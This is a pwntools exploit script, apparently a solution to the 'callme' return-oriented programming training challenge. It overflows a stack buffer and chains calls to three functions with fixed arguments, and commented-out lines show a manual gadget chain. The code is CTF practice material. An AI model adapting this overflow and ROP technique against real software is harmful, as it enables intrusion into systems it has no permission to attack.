#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('callme')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *pwnme+89
continue
'''.format(**locals())

# -- Exploit goes here --

pop_rdi_rsi_rdx = 0x000000000040093c
ret = 0x00000000004006be

params = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]
rop = ROP(exe)
rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)

print(rop.dump())
pay = b'\x90' * 40
pay += p64(ret)
pay += rop.chain()
# pay += p64(pop_rdi_rsi_rdx)
# pay += p64(0xdeadbeefdeadbeef)
# pay += p64(0xcafebabecafebabe)
# pay += p64(0xd00df00dd00df00d)
# pay += p64(exe.sym.callme_one)

# pay += p64(pop_rdi_rsi_rdx)
# pay += p64(0xdeadbeefdeadbeef)
# pay += p64(0xcafebabecafebabe)
# pay += p64(0xd00df00dd00df00d)
# pay += p64(exe.sym.callme_two)


# pay += p64(pop_rdi_rsi_rdx)
# pay += p64(0xdeadbeefdeadbeef)
# pay += p64(0xcafebabecafebabe)
# pay += p64(0xd00df00dd00df00d)
# pay += p64(exe.sym.callme_three)

io = start()
io.sendlineafter(b'> ', pay)
io.interactive()

